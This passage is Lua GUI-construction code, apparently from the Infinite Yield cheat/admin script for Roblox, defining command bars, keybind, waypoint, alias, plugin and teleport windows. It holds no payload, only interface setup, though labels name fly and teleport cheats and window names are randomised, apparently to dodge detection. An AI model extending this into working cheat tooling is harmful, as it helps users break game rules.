	Cmdbar_2.Font = Enum.Font.SourceSans
	Cmdbar_2.PlaceholderText = "Command"
	Cmdbar_2.Text = ""
	Cmdbar_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	Cmdbar_2.TextSize = 14.000
	Cmdbar_2.TextXAlignment = Enum.TextXAlignment.Left

	Cmdbar_3.Name = "Cmdbar_3"
	Cmdbar_3.Parent = background_2
	Cmdbar_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Cmdbar_3.BorderSizePixel = 0
	Cmdbar_3.Position = UDim2.new(0, 150, 0, 60)
	Cmdbar_3.Size = UDim2.new(0, 150, 0, 20)
	Cmdbar_3.ZIndex = 10
	Cmdbar_3.Font = Enum.Font.SourceSans
	Cmdbar_3.PlaceholderText = "Command 2"
	Cmdbar_3.Text = ""
	Cmdbar_3.TextColor3 = Color3.fromRGB(255, 255, 255)
	Cmdbar_3.TextSize = 14.000
	Cmdbar_3.TextXAlignment = Enum.TextXAlignment.Left

	CreateToggle.Name = "CreateToggle"
	CreateToggle.Parent = background_2
	CreateToggle.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	CreateToggle.BackgroundTransparency = 1
	CreateToggle.BorderSizePixel = 0
	CreateToggle.Position = UDim2.new(0, 152, 0, 10)
	CreateToggle.Size = UDim2.new(0, 198, 0, 20)
	CreateToggle.ZIndex = 10
	CreateToggle.Font = Enum.Font.SourceSans
	CreateToggle.Text = "Create Toggle"
	CreateToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
	CreateToggle.TextSize = 14.000
	CreateToggle.TextXAlignment = Enum.TextXAlignment.Left
	table.insert(text1,CreateToggle)

	Button_2.Name = "Button"
	Button_2.Parent = CreateToggle
	Button_2.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Button_2.BorderSizePixel = 0
	Button_2.Position = UDim2.new(1, -20, 0, 0)
	Button_2.Size = UDim2.new(0, 20, 0, 20)
	Button_2.ZIndex = 10
	table.insert(shade3,Button_2)

	On_2.Name = "On"
	On_2.Parent = Button_2
	On_2.BackgroundColor3 = Color3.fromRGB(150, 150, 151)
	On_2.BackgroundTransparency = 1
	On_2.BorderSizePixel = 0
	On_2.Position = UDim2.new(0, 2, 0, 2)
	On_2.Size = UDim2.new(0, 16, 0, 16)
	On_2.ZIndex = 10
	On_2.Font = Enum.Font.SourceSans
	On_2.Text = ""
	On_2.TextColor3 = Color3.fromRGB(0, 0, 0)
	On_2.TextSize = 14.000

	shadow_2.Name = "shadow"
	shadow_2.Parent = KeybindEditor
	shadow_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	shadow_2.BorderSizePixel = 0
	shadow_2.Size = UDim2.new(0, 360, 0, 20)
	shadow_2.ZIndex = 10
	table.insert(shade2,shadow_2)

	PopupText_2.Name = "PopupText_2"
	PopupText_2.Parent = shadow_2
	PopupText_2.BackgroundTransparency = 1
	PopupText_2.Size = UDim2.new(1, 0, 0.949999988, 0)
	PopupText_2.ZIndex = 10
	PopupText_2.Font = Enum.Font.SourceSans
	PopupText_2.Text = "Set Keybinds"
	PopupText_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	PopupText_2.TextSize = 14.000
	PopupText_2.TextWrapped = true
	table.insert(text1,PopupText_2)

	Exit_2.Name = "Exit_2"
	Exit_2.Parent = shadow_2
	Exit_2.BackgroundTransparency = 1
	Exit_2.Position = UDim2.new(1, -20, 0, 0)
	Exit_2.Size = UDim2.new(0, 20, 0, 20)
	Exit_2.ZIndex = 10
	Exit_2.Text = ""

	ExitImage_2.Parent = Exit_2
	ExitImage_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ExitImage_2.BackgroundTransparency = 1
	ExitImage_2.Position = UDim2.new(0, 5, 0, 5)
	ExitImage_2.Size = UDim2.new(0, 10, 0, 10)
	ExitImage_2.ZIndex = 10
	ExitImage_2.Image = "rbxassetid://5054663650"

	PositionsFrame.Name = "PositionsFrame"
	PositionsFrame.Parent = Settings
	PositionsFrame.Active = true
	PositionsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	PositionsFrame.BorderSizePixel = 0
	PositionsFrame.Size = UDim2.new(0, 250, 0, 175)
	PositionsFrame.Position = UDim2.new(0, 0, 0, 175)
	PositionsFrame.ZIndex = 10
	table.insert(shade1,PositionsFrame)

	Close_3.Name = "Close"
	Close_3.Parent = PositionsFrame
	Close_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Close_3.BorderSizePixel = 0
	Close_3.Position = UDim2.new(0, 205, 0, 150)
	Close_3.Size = UDim2.new(0, 40, 0, 20)
	Close_3.Font = Enum.Font.SourceSans
	Close_3.TextSize = 14
	Close_3.Text = "Close"
	Close_3.TextColor3 = Color3.new(1, 1, 1)
	Close_3.ZIndex = 10
	table.insert(shade2,Close_3)
	table.insert(text1,Close_3)

	Delete_5.Name = "Delete"
	Delete_5.Parent = PositionsFrame
	Delete_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Delete_5.BorderSizePixel = 0
	Delete_5.Position = UDim2.new(0, 50, 0, 150)
	Delete_5.Size = UDim2.new(0, 40, 0, 20)
	Delete_5.Font = Enum.Font.SourceSans
	Delete_5.TextSize = 14
	Delete_5.Text = "Clear"
	Delete_5.TextColor3 = Color3.new(1, 1, 1)
	Delete_5.ZIndex = 10
	table.insert(shade2,Delete_5)
	table.insert(text1,Delete_5)

	Part.Name = "PartGoto"
	Part.Parent = PositionsFrame
	Part.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Part.BorderSizePixel = 0
	Part.Position = UDim2.new(0, 5, 0, 150)
	Part.Size = UDim2.new(0, 40, 0, 20)
	Part.Font = Enum.Font.SourceSans
	Part.TextSize = 14
	Part.Text = "Part"
	Part.TextColor3 = Color3.new(1, 1, 1)
	Part.ZIndex = 10
	table.insert(shade2,Part)
	table.insert(text1,Part)

	Holder_4.Name = "Holder"
	Holder_4.Parent = PositionsFrame
	Holder_4.BackgroundTransparency = 1
	Holder_4.BorderSizePixel = 0
	Holder_4.Position = UDim2.new(0, 0, 0, 0)
	Holder_4.Selectable = false
	Holder_4.Size = UDim2.new(0, 250, 0, 145)
	Holder_4.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Holder_4.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_4.CanvasSize = UDim2.new(0, 0, 0, 0)
	Holder_4.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_4.ScrollBarThickness = 0
	Holder_4.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_4.VerticalScrollBarInset = 'Always'
	Holder_4.ZIndex = 10

	Example_4.Name = "Example"
	Example_4.Parent = PositionsFrame
	Example_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Example_4.BorderSizePixel = 0
	Example_4.Size = UDim2.new(0, 10, 0, 20)
	Example_4.Visible = false
	Example_4.Position = UDim2.new(0, 0, 0, -5)
	Example_4.ZIndex = 10
	table.insert(shade2,Example_4)

	Text_5.Name = "Text"
	Text_5.Parent = Example_4
	Text_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Text_5.BorderSizePixel = 0
	Text_5.Position = UDim2.new(0, 10, 0, 0)
	Text_5.Size = UDim2.new(0, 240, 0, 20)
	Text_5.Font = Enum.Font.SourceSans
	Text_5.TextSize = 14
	Text_5.Text = "Position"
	Text_5.TextColor3 = Color3.new(1, 1, 1)
	Text_5.TextXAlignment = Enum.TextXAlignment.Left
	Text_5.ZIndex = 10
	table.insert(shade2,Text_5)
	table.insert(text1,Text_5)

	Delete_6.Name = "Delete"
	Delete_6.Parent = Text_5
	Delete_6.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Delete_6.BorderSizePixel = 0
	Delete_6.Position = UDim2.new(0, 200, 0, 0)
	Delete_6.Size = UDim2.new(0, 40, 0, 20)
	Delete_6.Font = Enum.Font.SourceSans
	Delete_6.TextSize = 14
	Delete_6.Text = "Delete"
	Delete_6.TextColor3 = Color3.new(0, 0, 0)
	Delete_6.ZIndex = 10
	table.insert(shade3,Delete_6)
	table.insert(text2,Delete_6)

	TP.Name = "TP"
	TP.Parent = Text_5
	TP.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	TP.BorderSizePixel = 0
	TP.Position = UDim2.new(0, 155, 0, 0)
	TP.Size = UDim2.new(0, 40, 0, 20)
	TP.Font = Enum.Font.SourceSans
	TP.TextSize = 14
	TP.Text = "Goto"
	TP.TextColor3 = Color3.new(0, 0, 0)
	TP.ZIndex = 10
	table.insert(shade3,TP)
	table.insert(text2,TP)

	AliasesFrame.Name = "AliasesFrame"
	AliasesFrame.Parent = Settings
	AliasesFrame.Active = true
	AliasesFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	AliasesFrame.BorderSizePixel = 0
	AliasesFrame.Position = UDim2.new(0, 0, 0, 175)
	AliasesFrame.Size = UDim2.new(0, 250, 0, 175)
	AliasesFrame.ZIndex = 10
	table.insert(shade1,AliasesFrame)

	Close_2.Name = "Close"
	Close_2.Parent = AliasesFrame
	Close_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Close_2.BorderSizePixel = 0
	Close_2.Position = UDim2.new(0, 205, 0, 150)
	Close_2.Size = UDim2.new(0, 40, 0, 20)
	Close_2.Font = Enum.Font.SourceSans
	Close_2.TextSize = 14
	Close_2.Text = "Close"
	Close_2.TextColor3 = Color3.new(1, 1, 1)
	Close_2.ZIndex = 10
	table.insert(shade2,Close_2)
	table.insert(text1,Close_2)

	Delete_3.Name = "Delete"
	Delete_3.Parent = AliasesFrame
	Delete_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Delete_3.BorderSizePixel = 0
	Delete_3.Position = UDim2.new(0, 5, 0, 150)
	Delete_3.Size = UDim2.new(0, 40, 0, 20)
	Delete_3.Font = Enum.Font.SourceSans
	Delete_3.TextSize = 14
	Delete_3.Text = "Clear"
	Delete_3.TextColor3 = Color3.new(1, 1, 1)
	Delete_3.ZIndex = 10
	table.insert(shade2,Delete_3)
	table.insert(text1,Delete_3)

	Holder_3.Name = "Holder"
	Holder_3.Parent = AliasesFrame
	Holder_3.BackgroundTransparency = 1
	Holder_3.BorderSizePixel = 0
	Holder_3.Position = UDim2.new(0, 0, 0, 0)
	Holder_3.Size = UDim2.new(0, 250, 0, 145)
	Holder_3.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Holder_3.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_3.CanvasSize = UDim2.new(0, 0, 0, 0)
	Holder_3.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_3.ScrollBarThickness = 0
	Holder_3.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_3.VerticalScrollBarInset = 'Always'
	Holder_3.ZIndex = 10

	Example_3.Name = "Example"
	Example_3.Parent = AliasesFrame
	Example_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Example_3.BorderSizePixel = 0
	Example_3.Size = UDim2.new(0, 10, 0, 20)
	Example_3.Visible = false
	Example_3.ZIndex = 10
	table.insert(shade2,Example_3)

	Text_4.Name = "Text"
	Text_4.Parent = Example_3
	Text_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Text_4.BorderSizePixel = 0
	Text_4.Position = UDim2.new(0, 10, 0, 0)
	Text_4.Size = UDim2.new(0, 240, 0, 20)
	Text_4.Font = Enum.Font.SourceSans
	Text_4.TextSize = 14
	Text_4.Text = "honk"
	Text_4.TextColor3 = Color3.new(1, 1, 1)
	Text_4.TextXAlignment = Enum.TextXAlignment.Left
	Text_4.ZIndex = 10
	table.insert(shade2,Text_4)
	table.insert(text1,Text_4)

	Delete_4.Name = "Delete"
	Delete_4.Parent = Text_4
	Delete_4.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Delete_4.BorderSizePixel = 0
	Delete_4.Position = UDim2.new(0, 200, 0, 0)
	Delete_4.Size = UDim2.new(0, 40, 0, 20)
	Delete_4.Font = Enum.Font.SourceSans
	Delete_4.TextSize = 14
	Delete_4.Text = "Delete"
	Delete_4.TextColor3 = Color3.new(0, 0, 0)
	Delete_4.ZIndex = 10
	table.insert(shade3,Delete_4)
	table.insert(text2,Delete_4)

	PluginsFrame.Name = "PluginsFrame"
	PluginsFrame.Parent = Settings
	PluginsFrame.Active = true
	PluginsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	PluginsFrame.BorderSizePixel = 0
	PluginsFrame.Position = UDim2.new(0, 0, 0, 175)
	PluginsFrame.Size = UDim2.new(0, 250, 0, 175)
	PluginsFrame.ZIndex = 10
	table.insert(shade1,PluginsFrame)

	Close_4.Name = "Close"
	Close_4.Parent = PluginsFrame
	Close_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Close_4.BorderSizePixel = 0
	Close_4.Position = UDim2.new(0, 205, 0, 150)
	Close_4.Size = UDim2.new(0, 40, 0, 20)
	Close_4.Font = Enum.Font.SourceSans
	Close_4.TextSize = 14
	Close_4.Text = "Close"
	Close_4.TextColor3 = Color3.new(1, 1, 1)
	Close_4.ZIndex = 10
	table.insert(shade2,Close_4)
	table.insert(text1,Close_4)

	Add_3.Name = "Add"
	Add_3.Parent = PluginsFrame
	Add_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Add_3.BorderSizePixel = 0
	Add_3.Position = UDim2.new(0, 5, 0, 150)
	Add_3.Size = UDim2.new(0, 40, 0, 20)
	Add_3.Font = Enum.Font.SourceSans
	Add_3.TextSize = 14
	Add_3.Text = "Add"
	Add_3.TextColor3 = Color3.new(1, 1, 1)
	Add_3.ZIndex = 10
	table.insert(shade2,Add_3)
	table.insert(text1,Add_3)

	Holder_5.Name = "Holder"
	Holder_5.Parent = PluginsFrame
	Holder_5.BackgroundTransparency = 1
	Holder_5.BorderSizePixel = 0
	Holder_5.Position = UDim2.new(0, 0, 0, 0)
	Holder_5.Selectable = false
	Holder_5.Size = UDim2.new(0, 250, 0, 145)
	Holder_5.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Holder_5.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_5.CanvasSize = UDim2.new(0, 0, 0, 0)
	Holder_5.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_5.ScrollBarThickness = 0
	Holder_5.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_5.VerticalScrollBarInset = 'Always'
	Holder_5.ZIndex = 10

	Example_5.Name = "Example"
	Example_5.Parent = PluginsFrame
	Example_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Example_5.BorderSizePixel = 0
	Example_5.Size = UDim2.new(0, 10, 0, 20)
	Example_5.Visible = false
	Example_5.ZIndex = 10
	table.insert(shade2,Example_5)

	Text_6.Name = "Text"
	Text_6.Parent = Example_5
	Text_6.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Text_6.BorderSizePixel = 0
	Text_6.Position = UDim2.new(0, 10, 0, 0)
	Text_6.Size = UDim2.new(0, 240, 0, 20)
	Text_6.Font = Enum.Font.SourceSans
	Text_6.TextSize = 14
	Text_6.Text = "F4 > Toggle Fly"
	Text_6.TextColor3 = Color3.new(1, 1, 1)
	Text_6.TextXAlignment = Enum.TextXAlignment.Left
	Text_6.ZIndex = 10
	table.insert(shade2,Text_6)
	table.insert(text1,Text_6)

	Delete_7.Name = "Delete"
	Delete_7.Parent = Text_6
	Delete_7.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Delete_7.BorderSizePixel = 0
	Delete_7.Position = UDim2.new(0, 200, 0, 0)
	Delete_7.Size = UDim2.new(0, 40, 0, 20)
	Delete_7.Font = Enum.Font.SourceSans
	Delete_7.TextSize = 14
	Delete_7.Text = "Delete"
	Delete_7.TextColor3 = Color3.new(0, 0, 0)
	Delete_7.ZIndex = 10
	table.insert(shade3,Delete_7)
	table.insert(text2,Delete_7)

	PluginEditor.Name = randomString()
	PluginEditor.Parent = PARENT
	PluginEditor.BorderSizePixel = 0
	PluginEditor.Active = true
	PluginEditor.BackgroundTransparency = 1
	PluginEditor.Position = UDim2.new(0.5, -180, 0, -500)
	PluginEditor.Size = UDim2.new(0, 360, 0, 20)
	PluginEditor.ZIndex = 10

	background_3.Name = "background"
	background_3.Parent = PluginEditor
	background_3.Active = true
	background_3.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	background_3.BorderSizePixel = 0
	background_3.Position = UDim2.new(0, 0, 0, 20)
	background_3.Size = UDim2.new(0, 360, 0, 160)
	background_3.ZIndex = 10
	table.insert(shade1,background_3)

	Dark_2.Name = "Dark"
	Dark_2.Parent = background_3
	Dark_2.Active = true
	Dark_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Dark_2.BorderSizePixel = 0
	Dark_2.Position = UDim2.new(0, 222, 0, 0)
	Dark_2.Size = UDim2.new(0, 2, 0, 160)
	Dark_2.ZIndex = 10
	table.insert(shade2,Dark_2)

	Img.Name = "Img"
	Img.Parent = background_3
	Img.BackgroundTransparency = 1
	Img.Position = UDim2.new(0, 242, 0, 3)
	Img.Size = UDim2.new(0, 100, 0, 95)
	Img.Image = "rbxassetid://4113050383"
	Img.ZIndex = 10

	AddPlugin.Name = "AddPlugin"
	AddPlugin.Parent = background_3
	AddPlugin.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	AddPlugin.BorderSizePixel = 0
	AddPlugin.Position = UDim2.new(0, 235, 0, 100)
	AddPlugin.Size = UDim2.new(0, 115, 0, 50)
	AddPlugin.Font = Enum.Font.SourceSans
	AddPlugin.TextSize = 14
	AddPlugin.Text = "Add Plugin"
	AddPlugin.TextColor3 = Color3.new(1, 1, 1)
	AddPlugin.ZIndex = 10
	table.insert(shade2,AddPlugin)
	table.insert(text1,AddPlugin)

	FileName.Name = "FileName"
	FileName.Parent = background_3
	FileName.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	FileName.BorderSizePixel = 0
	FileName.Position = UDim2.new(0.028, 0, 0.625, 0)
	FileName.Size = UDim2.new(0, 200, 0, 50)
	FileName.Font = Enum.Font.SourceSans
	FileName.TextSize = 14
	FileName.Text = "Plugin File Name"
	FileName.TextColor3 = Color3.new(1, 1, 1)
	FileName.ZIndex = 10
	table.insert(shade2,FileName)
	table.insert(text1,FileName)

	About.Name = "About"
	About.Parent = background_3
	About.BackgroundTransparency = 1
	About.BorderSizePixel = 0
	About.Position = UDim2.new(0, 17, 0, 10)
	About.Size = UDim2.new(0, 187, 0, 49)
	About.Font = Enum.Font.SourceSans
	About.TextSize = 14
	About.Text = "Plugins are .iy files and should be located in the 'workspace' folder of your exploit."
	About.TextColor3 = Color3.fromRGB(255, 255, 255)
	About.TextWrapped = true
	About.TextYAlignment = Enum.TextYAlignment.Top
	About.ZIndex = 10
	table.insert(text1,About)

	Directions_2.Name = "Directions"
	Directions_2.Parent = background_3
	Directions_2.BackgroundTransparency = 1
	Directions_2.BorderSizePixel = 0
	Directions_2.Position = UDim2.new(0, 17, 0, 60)
	Directions_2.Size = UDim2.new(0, 187, 0, 49)
	Directions_2.Font = Enum.Font.SourceSans
	Directions_2.TextSize = 14
	Directions_2.Text = "Type the name of the plugin file you want to add below."
	Directions_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	Directions_2.TextWrapped = true
	Directions_2.TextYAlignment = Enum.TextYAlignment.Top
	Directions_2.ZIndex = 10
	table.insert(text1,Directions_2)

	shadow_3.Name = "shadow"
	shadow_3.Parent = PluginEditor
	shadow_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	shadow_3.BorderSizePixel = 0
	shadow_3.Size = UDim2.new(0, 360, 0, 20)
	shadow_3.ZIndex = 10
	table.insert(shade2,shadow_3)

	PopupText_3.Name = "PopupText"
	PopupText_3.Parent = shadow_3
	PopupText_3.BackgroundTransparency = 1
	PopupText_3.Size = UDim2.new(1, 0, 0.95, 0)
	PopupText_3.ZIndex = 10
	PopupText_3.Font = Enum.Font.SourceSans
	PopupText_3.TextSize = 14
	PopupText_3.Text = "Add Plugins"
	PopupText_3.TextColor3 = Color3.new(1, 1, 1)
	PopupText_3.TextWrapped = true
	table.insert(text1,PopupText_3)

	Exit_3.Name = "Exit"
	Exit_3.Parent = shadow_3
	Exit_3.BackgroundTransparency = 1
	Exit_3.Position = UDim2.new(1, -20, 0, 0)
	Exit_3.Size = UDim2.new(0, 20, 0, 20)
	Exit_3.Text = ""
	Exit_3.ZIndex = 10

	ExitImage_3.Parent = Exit_3
	ExitImage_3.BackgroundColor3 = Color3.new(1, 1, 1)
	ExitImage_3.BackgroundTransparency = 1
	ExitImage_3.Position = UDim2.new(0, 5, 0, 5)
	ExitImage_3.Size = UDim2.new(0, 10, 0, 10)
	ExitImage_3.Image = "rbxassetid://5054663650"
	ExitImage_3.ZIndex = 10

	AliasHint.Name = "AliasHint"
	AliasHint.Parent = AliasesFrame
	AliasHint.BackgroundTransparency = 1
	AliasHint.BorderSizePixel = 0
	AliasHint.Position = UDim2.new(0, 25, 0, 40)
	AliasHint.Size = UDim2.new(0, 200, 0, 50)
	AliasHint.Font = Enum.Font.SourceSansItalic
	AliasHint.TextSize = 16
	AliasHint.Text = "Add aliases by using the 'addalias' command"
	AliasHint.TextColor3 = Color3.new(1, 1, 1)
	AliasHint.TextStrokeColor3 = Color3.new(1, 1, 1)
	AliasHint.TextWrapped = true
	AliasHint.ZIndex = 10
	table.insert(text1,AliasHint)

	PluginsHint.Name = "PluginsHint"
	PluginsHint.Parent = PluginsFrame
	PluginsHint.BackgroundTransparency = 1
	PluginsHint.BorderSizePixel = 0
	PluginsHint.Position = UDim2.new(0, 25, 0, 40)
	PluginsHint.Size = UDim2.new(0, 200, 0, 50)
	PluginsHint.Font = Enum.Font.SourceSansItalic
	PluginsHint.TextSize = 16
	PluginsHint.Text = "Download plugins from the IY Discord (discord.io/infiniteyield)"
	PluginsHint.TextColor3 = Color3.new(1, 1, 1)
	PluginsHint.TextStrokeColor3 = Color3.new(1, 1, 1)
	PluginsHint.TextWrapped = true
	PluginsHint.ZIndex = 10
	table.insert(text1,PluginsHint)

	PositionsHint.Name = "PositionsHint"
	PositionsHint.Parent = PositionsFrame
	PositionsHint.BackgroundTransparency = 1
	PositionsHint.BorderSizePixel = 0
	PositionsHint.Position = UDim2.new(0, 25, 0, 40)
	PositionsHint.Size = UDim2.new(0, 200, 0, 70)
	PositionsHint.Font = Enum.Font.SourceSansItalic
	PositionsHint.TextSize = 16
	PositionsHint.Text = "Use the 'swp' or 'setwaypoint' command to add a position using your character (NOTE: Part teleports will not save)"
	PositionsHint.TextColor3 = Color3.new(1, 1, 1)
	PositionsHint.TextStrokeColor3 = Color3.new(1, 1, 1)
	PositionsHint.TextWrapped = true
	PositionsHint.ZIndex = 10
	table.insert(text1,PositionsHint)

	ToPartFrame.Name = randomString()
	ToPartFrame.Parent = PARENT
	ToPartFrame.Active = true
	ToPartFrame.BackgroundTransparency = 1
	ToPartFrame.Position = UDim2.new(0.5, -180, 0, -500)
	ToPartFrame.Size = UDim2.new(0, 360, 0, 20)
	ToPartFrame.ZIndex = 10

	background_4.Name = "background"
	background_4.Parent = ToPartFrame
	background_4.Active = true
	background_4.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	background_4.BorderSizePixel = 0
	background_4.Position = UDim2.new(0, 0, 0, 20)
	background_4.Size = UDim2.new(0, 360, 0, 117)
	background_4.ZIndex = 10
	table.insert(shade1,background_4)

	ChoosePart.Name = "ChoosePart"
	ChoosePart.Parent = background_4
	ChoosePart.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	ChoosePart.BorderSizePixel = 0
	ChoosePart.Position = UDim2.new(0, 100, 0, 55)
	ChoosePart.Size = UDim2.new(0, 75, 0, 30)
	ChoosePart.Font = Enum.Font.SourceSans
	ChoosePart.TextSize = 14
	ChoosePart.Text = "Select Part"
	ChoosePart.TextColor3 = Color3.new(1, 1, 1)
	ChoosePart.ZIndex = 10
	table.insert(shade2,ChoosePart)
	table.insert(text1,ChoosePart)

	CopyPath.Name = "CopyPath"
	CopyPath.Parent = background_4
	CopyPath.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	CopyPath.BorderSizePixel = 0
	CopyPath.Position = UDim2.new(0, 185, 0, 55)
	CopyPath.Size = UDim2.new(0, 75, 0, 30)
	CopyPath.Font = Enum.Font.SourceSans
	CopyPath.TextSize = 14
	CopyPath.Text = "Copy Path"
	CopyPath.TextColor3 = Color3.new(1, 1, 1)
	CopyPath.ZIndex = 10
	table.insert(shade2,CopyPath)
	table.insert(text1,CopyPath)

	Directions_3.Name = "Directions"
	Directions_3.Parent = background_4
	Directions_3.BackgroundTransparency = 1
	Directions_3.BorderSizePixel = 0
	Directions_3.Position = UDim2.new(0, 51, 0, 17)
	Directions_3.Size = UDim2.new(0, 257, 0, 32)
	Directions_3.Font = Enum.Font.SourceSans
	Directions_3.TextSize = 14
	Directions_3.Text = 'Click on a part and then click the "Select Part" button below to set it as a teleport location'
	Directions_3.TextColor3 = Color3.new(1, 1, 1)
	Directions_3.TextWrapped = true
	Directions_3.TextYAlignment = Enum.TextYAlignment.Top
	Directions_3.ZIndex = 10
	table.insert(text1,Directions_3)

	Path.Name = "Path"
	Path.Parent = background_4
	Path.BackgroundTransparency = 1
	Path.BorderSizePixel = 0
	Path.Position = UDim2.new(0, 0, 0, 94)
	Path.Size = UDim2.new(0, 360, 0, 16)
	Path.Font = Enum.Font.SourceSansItalic
	Path.TextSize = 14
	Path.Text = ""
	Path.TextColor3 = Color3.new(1, 1, 1)
	Path.TextScaled = true
	Path.TextWrapped = true
	Path.TextYAlignment = Enum.TextYAlignment.Top
	Path.ZIndex = 10
	table.insert(text1,Path)

	shadow_4.Name = "shadow"
	shadow_4.Parent = ToPartFrame
	shadow_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	shadow_4.BorderSizePixel = 0
	shadow_4.Size = UDim2.new(0, 360, 0, 20)
	shadow_4.ZIndex = 10
	table.insert(shade2,shadow_4)

	PopupText_5.Name = "PopupText"
	PopupText_5.Parent = shadow_4
	PopupText_5.BackgroundTransparency = 1
	PopupText_5.Size = UDim2.new(1, 0, 0.95, 0)
	PopupText_5.ZIndex = 10
	PopupText_5.Font = Enum.Font.SourceSans
	PopupText_5.TextSize = 14
	PopupText_5.Text = "Teleport to Part"
	PopupText_5.TextColor3 = Color3.new(1, 1, 1)
	PopupText_5.TextWrapped = true
	table.insert(text1,PopupText_5)

	Exit_4.Name = "Exit"
	Exit_4.Parent = shadow_4
	Exit_4.BackgroundTransparency = 1
	Exit_4.Position = UDim2.new(1, -20, 0, 0)
	Exit_4.Size = UDim2.new(0, 20, 0, 20)
	Exit_4.Text = ""
	Exit_4.ZIndex = 10

	ExitImage_5.Parent = Exit_4
	ExitImage_5.BackgroundColor3 = Color3.new(1, 1, 1)
	ExitImage_5.BackgroundTransparency = 1
	ExitImage_5.Position = UDim2.new(0, 5, 0, 5)
	ExitImage_5.Size = UDim2.new(0, 10, 0, 10)
	ExitImage_5.Image = "rbxassetid://5054663650"
	ExitImage_5.ZIndex = 10

	logs.Name = randomString()
	logs.Parent = PARENT
	logs.Active = true
	logs.BackgroundTransparency = 1
	logs.Position = UDim2.new(0, 0, 1, 10)
	logs.Size = UDim2.new(0, 338, 0, 20)
	logs.ZIndex = 10

	shadow.Name = "shadow"
	shadow.Parent = logs
	shadow.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	shadow.BorderSizePixel = 0
	shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
	shadow.Size = UDim2.new(0, 338, 0, 20)
	shadow.ZIndex = 10
	table.insert(shade2,shadow)

	Hide.Name = "Hide"
	Hide.Parent = shadow
	Hide.BackgroundTransparency = 1
	Hide.Position = UDim2.new(1, -40, 0, 0)
	Hide.Size = UDim2.new(0, 20, 0, 20)
	Hide.ZIndex = 10
	Hide.Text = ""

	ImageLabel.Parent = Hide
	ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel.BackgroundTransparency = 1
	ImageLabel.Position = UDim2.new(0, 3, 0, 3)
	ImageLabel.Size = UDim2.new(0, 14, 0, 14)
	ImageLabel.Image = "rbxassetid://2406617031"
	ImageLabel.ZIndex = 10

	PopupText.Name = "PopupText"
	PopupText.Parent = shadow
	PopupText.BackgroundTransparency = 1
	PopupText.Size = UDim2.new(1, 0, 0.949999988, 0)
	PopupText.ZIndex = 10
	PopupText.Font = Enum.Font.SourceSans
	PopupText.FontSize = Enum.FontSize.Size14
	PopupText.Text = "Logs"
	PopupText.TextColor3 = Color3.new(1, 1, 1)
	PopupText.TextWrapped = true
	table.insert(text1,PopupText)

	Exit.Name = "Exit"
	Exit.Parent = shadow
	Exit.BackgroundTransparency = 1
	Exit.Position = UDim2.new(1, -20, 0, 0)
	Exit.Size = UDim2.new(0, 20, 0, 20)
	Exit.ZIndex = 10
	Exit.Text = ""

	ImageLabel_2.Parent = Exit
	ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel_2.BackgroundTransparency = 1
	ImageLabel_2.Position = UDim2.new(0, 5, 0, 5)
	ImageLabel_2.Size = UDim2.new(0, 10, 0, 10)
	ImageLabel_2.Image = "rbxassetid://5054663650"
	ImageLabel_2.ZIndex = 10

	background.Name = "background"
	background.Parent = logs
	background.Active = true
	background.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
	background.BorderSizePixel = 0
	background.ClipsDescendants = true
	background.Position = UDim2.new(0, 0, 1, 0)
	background.Size = UDim2.new(0, 338, 0, 245)
	background.ZIndex = 10
